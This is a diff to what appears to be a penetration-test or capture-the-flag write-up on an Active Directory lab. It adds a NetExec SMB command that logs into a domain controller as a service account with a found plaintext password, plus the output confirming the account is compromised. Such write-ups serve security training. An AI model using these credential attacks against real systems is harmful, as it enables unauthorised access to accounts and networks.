@@ -1193,5 +1193,15 @@ I have found a password for a domain account
 Infr@Mgmt2026!Secure
 ```
 
+# Compromising `svc_infra_mgr`
+
+```python
+nxc smb dc01.ctos.corp -u svc_infra_mgr -p 'Infr@Mgmt2026!Secure'
+SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\svc_infra_mgr:Infr@Mgmt2026!Secure
+```
+
+This user is now compromised!
+
 
 
